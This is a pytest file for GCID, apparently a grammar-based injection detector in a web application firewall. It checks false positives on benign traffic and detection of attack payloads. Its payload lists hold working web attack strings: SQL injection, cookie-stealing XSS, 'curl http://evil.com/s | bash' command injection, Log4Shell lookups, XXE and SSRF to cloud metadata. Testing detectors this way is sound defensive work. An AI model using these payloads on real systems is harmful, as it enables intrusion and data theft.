"""Tests for GCID — grammar-conformance injection detection (ml/gcid.py).

These are MEASUREMENT tests, in the style of the rest of this repo's ML tests: the assertions
encode the budgets GCID claims to meet, and the honest-limit cases PRINT their numbers instead of
asserting, because it is CORRECT for an injection detector to miss SSRF and business-logic attacks.
A test that asserted GCID catches everything would be asserting a false claim.

Runs with no torch and no network beyond what the model artifacts already need.
"""
from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ml.gcid import (  # noqa: E402
    GRAMMAR_NAMES, FEATURE_NAMES, N_FEATURES, MODEL_PATH, META_PATH,
    GcidDetector, gcid_contract_hash, normalize, structure_vector,
)

pytestmark = pytest.mark.skipif(
    not (MODEL_PATH.exists() and META_PATH.exists()),
    reason="GCID artifacts not built — run: python -m ml.gcid --train",
)


@pytest.fixture(scope="module")
def det():
    return GcidDetector()


# --------------------------------------------------------------------- featurizer contract

def test_structure_vector_shape_and_range():
    v = structure_vector("GET", "/", "q=hello world", "")
    assert v.shape == (N_FEATURES,)
    assert v[:len(GRAMMAR_NAMES)].min() >= 0.0 and v[:len(GRAMMAR_NAMES)].max() <= 1.0


def test_contract_hash_is_stable_and_matches_artifact(det):
    assert gcid_contract_hash() == det.meta["contract_hash"]
    assert det.contract_verified, "serving feature contract must match the trained one"
    assert det.meta["feature_names"] == FEATURE_NAMES


def test_normalize_is_bounded_and_surfaces_base64():
    # bounded decode rounds: a decode bomb must not loop
    assert normalize("%2525252525252e") is not None
    # `JyBPUiAnMSc9JzE=` is base64 for `' OR '1'='1` — the decode stage must surface it
    assert "OR" in normalize("data=JyBPUiAnMSc9JzE=").upper()


# ------------------------------------------------------------------------ false positives

def test_no_false_positives_on_modern_benign(det):
    """The claim GCID exists to make: <=1% FP on modern benign, the traffic shape that broke
    every distribution-modelling layer in this repo (52-100% FP)."""
    from data_pipeline.modern_benign import generate
    recs = generate(300, seed=4242)          # a seed never used in training or calibration
    fp = [r for r in recs if det.predict(*r).is_malicious]
    rate = len(fp) / len(recs)
    assert rate <= 0.01, f"modern-benign FP {rate:.3%}: " + repr([(r, det.explain(*r)) for r in fp[:5]])


def test_no_false_positives_on_plain_benign(det):
    """Hand-written everyday traffic, including the shapes that carry surface entropy or
    punctuation but zero interpreter grammar."""
    benign = [
        ("GET", "/", "", ""),
        ("GET", "/search", "q=wireless headphones under 100", ""),
        ("POST", "/login", "", '{"username":"john.doe","password":"hunter2"}'),
        ("GET", "/api/v2/users/48213", "fields=name,email,avatar", ""),
        ("GET", "/articles/how-to-cook-pasta", "ref=homepage&utm=news", ""),
        ("GET", "/transfer", "to=jane.smith&amt=100&note=monthly rent", ""),
        ("GET", "/reports", "from=2024-09-01&to=2024-10-28", ""),
        ("GET", "/files", "path=/home/user/docs/report_2024.pdf", ""),
        ("POST", "/avatar", "", "image=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk"),
        ("GET", "/api/v1/items", "filter=price>100&sort=-created_at", ""),
        ("GET", "/regex", "pattern=^(a|b)+.*$&flags=gi", ""),
        ("GET", "/i18n", "msg=C'est l'ete -- vraiment", ""),
        ("GET", "/track", "utm_source=news&ref=a|b&tags=x,y,z", ""),
        ("POST", "/note", "", "text=Meeting notes: discuss Q3 & Q4; review budget"),
        ("GET", "/csv", "cols=id,name,email&format=csv", ""),
        ("GET", "/log", "q=java.lang.RuntimeException at com.example.Service", ""),
        ("GET", "/shell-tutorial", "q=what does ls -la do", ""),
        ("POST", "/api/schema", "", '{"$schema":"https://json-schema.org/draft/2020-12/schema"}'),
        ("GET", "/cdn", "u=data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==", ""),
        ("GET", "/redirect", "next=https://app.example.com/dashboard?tab=1", ""),
    ]
    fp = [r for r in benign if det.predict(*r).is_malicious]
    assert not fp, "benign false positives: " + repr([(r, det.explain(*r)) for r in fp])


def test_csic_real_benign_false_positive_budget(det):
    """Real 2010 traffic, a completely different distribution from the modern generator. The
    distribution-free claim means the SAME model must hold on both without retuning."""
    try:
        from data_pipeline.csic_loader import load
        recs = load("normal_test")[:500]
    except Exception as e:                                   # dataset not downloaded in this env
        pytest.skip(f"CSIC corpus unavailable: {e}")
    if not recs:
        pytest.skip("CSIC corpus empty")
    fp = sum(1 for r in recs if det.predict(*r).is_malicious)
    assert fp / len(recs) <= 0.01, f"CSIC benign FP {fp}/{len(recs)}"


# ------------------------------------------------------------------------ in-scope recall

IN_SCOPE_PAYLOADS = [
    ("sqli", "GET", "/", "id=1' OR '1'='1", ""),
    ("sqli", "GET", "/api/items", "id=1 UNION SELECT password FROM users-- -", ""),
    ("sqli", "GET", "/", "user=admin'--", ""),
    ("sqli", "POST", "/search", "", '{"q":"1; DROP TABLE users--"}'),
    ("sqli", "GET", "/", "id=1' AND SLEEP(5)-- -", ""),
    ("xss", "GET", "/", "q=<script>alert(1)</script>", ""),
    ("xss", "GET", "/", "q=<img src=x onerror=alert(document.cookie)>", ""),
    ("xss", "GET", "/", "next=javascript:alert(1)", ""),
    ("xss", "POST", "/comment", "", "body=<svg onload=fetch('//evil/'+document.cookie)>"),
    ("rce", "POST", "/run", "", "cmd=; cat /etc/passwd"),
    ("rce", "GET", "/exec", "cmd=$(whoami)", ""),
    ("rce", "GET", "/exec", "cmd=`id`", ""),
    ("rce", "GET", "/exec", "cmd=|| curl http://evil.com/s | bash", ""),
    ("lfi", "GET", "/download", "file=../../../../etc/passwd", ""),
    ("lfi", "GET", "/download", "file=php://filter/convert.base64-encode/resource=index.php", ""),
    ("log4shell", "GET", "/", "x=${jndi:ldap://evil.com/a}", ""),
    ("ssti", "GET", "/p", "name={{7*7}}{{config.items()}}", ""),
    ("ssti", "GET", "/p", "name=${T(java.lang.Runtime).getRuntime().exec('id')}", ""),
    ("xxe", "POST", "/xml", "", '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'),
    ("nosql", "POST", "/login", "", '{"user":{"$ne":null},"pass":{"$ne":null}}'),
    ("nosql", "POST", "/api", "", '{"$where":"this.password.length > 0"}'),
    ("ldap", "GET", "/dir", "filter=*)(uid=*))(|(uid=*", ""),
]


def test_in_scope_injection_recall(det):
    caught = [p for p in IN_SCOPE_PAYLOADS if det.predict(*p[1:]).is_malicious]
    recall = len(caught) / len(IN_SCOPE_PAYLOADS)
    missed = [(p[0], p[3] or p[4]) for p in IN_SCOPE_PAYLOADS if not det.predict(*p[1:]).is_malicious]
    assert recall >= 0.90, f"in-scope injection recall {recall:.1%}; missed {missed}"


OBFUSCATED = [
    ("url-encoded sqli", "GET", "/", "id=1%27%20OR%20%271%27%3D%271", ""),
    ("url-encoded xss", "GET", "/", "q=%3Cscript%3Ealert(1)%3C/script%3E", ""),
    ("case-mixed xss", "GET", "/", "q=<IMG SRC=x OnErRoR=alert(1)>", ""),
    ("comment-split sqli", "GET", "/", "id=' UN/**/ION SEL/**/ECT 1,2,3--", ""),
    ("mysql versioned comment", "GET", "/", "id=1' /*!50000UNION*/ /*!50000SELECT*/ pw FROM users--", ""),
    ("base64-wrapped sqli", "POST", "/api", "", "data=JyBPUiAnMSc9JzE="),
    ("double-encoded traversal", "GET", "/dl", "file=..%2f..%2f..%2fetc%2fpasswd", ""),
    ("filter-bypass traversal", "GET", "/dl", "file=....//....//etc/passwd", ""),
    ("IFS space-free rce", "GET", "/exec", "cmd=cat${IFS}/etc/passwd", ""),
    ("nested-lookup log4shell", "GET", "/", "x=${jndi:${lower:l}${lower:d}ap://evil.com/a}", ""),
]


def test_obfuscated_injection_is_still_caught(det):
    """Normalization (bounded URL-decode + base64 surfacing + SQL-comment stripping) must survive
    encoding tricks — otherwise the grammar layer is trivially bypassable."""
    missed = [name for name, *r in OBFUSCATED if not det.predict(*r).is_malicious]
    assert len(missed) <= 1, f"obfuscated injections missed: {missed}"


# --------------------------------------------------------- honest limits (measure, don't assert)

OUT_OF_SCOPE = [
    ("ssrf-internal", "GET", "/fetch", "url=http://169.254.169.254/latest/meta-data/", ""),
    ("ssrf-octal", "GET", "/fetch", "url=http://0177.0.0.1:6379/", ""),
    ("open-redirect", "GET", "/go", "next=https://evil.com/login", ""),
    ("idor", "GET", "/api/v1/invoices/1042", "", ""),
    ("mass-assignment", "POST", "/profile", "", '{"name":"bob","is_admin":true}'),
    ("auth-bypass", "GET", "/admin", "", ""),
]


def test_out_of_scope_families_are_honestly_out_of_scope(det, capsys):
    """GCID is an INJECTION detector. These attacks carry no interpreter grammar, so GCID scores
    them ~0 BY DESIGN and other layers (signatures, SSRF checks, authz) own them. This test
    DOCUMENTS that boundary rather than pretending it does not exist — but it does assert the
    detector stays quiet rather than guessing, which is the property that keeps it trustworthy."""
    rows = []
    for name, *r in OUT_OF_SCOPE:
        p = det.predict(*r)
        rows.append((name, p.is_malicious, p.mal_prob, det.explain(*r)))
    with capsys.disabled():
        print("\n  GCID out-of-scope readout (expected misses — handled by other layers):")
        for name, hit, prob, why in rows:
            print(f"    {'DETECT' if hit else 'miss  '} {name:18s} prob={prob:.3f} {why}")
    # The failure mode that WOULD be a bug: firing on out-of-scope traffic on no evidence.
    assert all(prob < 0.5 or hit for _, hit, prob, _ in rows)


def test_no_catastrophic_backtracking(det):
    """The grammar scorers are regexes, so they are themselves an attack surface. These are the
    harness's ReDoS probes; `s_nosql`'s JS-injection pattern was quadratic on a whitespace run
    (176ms on " \\t"x8192) until it was anchored on a literal."""
    import time
    probes = ["{{" + " " * 8192, "<" + "a" * 8192, "${" + " " * 8192, "A" * 70000,
              "(" * 4096 + ")" * 4096, " \t" * 8192, "; " * 8192, "QUJD" * 5000]
    det.predict("GET", "/", "q=warmup", "")          # exclude one-time import/JIT cost
    worst = 0.0
    for p in probes:
        t = time.perf_counter()
        det.predict("POST", "/", "", "x=" + p)
        worst = max(worst, (time.perf_counter() - t) * 1000)
    assert worst <= 100.0, f"worst ReDoS probe {worst:.1f}ms"


def test_shadow_by_default(det):
    """`enforce` must be False unless a deployment explicitly opts in — GCID has a measured
    false-positive class (fields that legitimately carry code: markdown, CI scripts, template
    previews), so it is not enforce-ready on general traffic."""
    if os.environ.get("WAF_GCID_ENFORCE", "").strip().lower() in ("1", "true", "yes"):
        pytest.skip("enforcement explicitly enabled in this environment")
    r = det.predict("GET", "/", "id=1' OR '1'='1", "")
    assert r.is_malicious and not r.enforce
    assert "shadow" in r.enforce_reason.lower()


def test_selectable_via_env(monkeypatch):
    """WAF_ML_MODEL=gcid must select GCID through the shared get_detector() entrypoint."""
    import ml.detector_v2 as d2
    monkeypatch.setenv("WAF_ML_MODEL", "gcid")
    monkeypatch.setattr(d2, "_detector", None)
    got = d2.get_detector()
    monkeypatch.setattr(d2, "_detector", None)
    assert type(got).__name__ == "GcidDetector", f"got {type(got).__name__}"
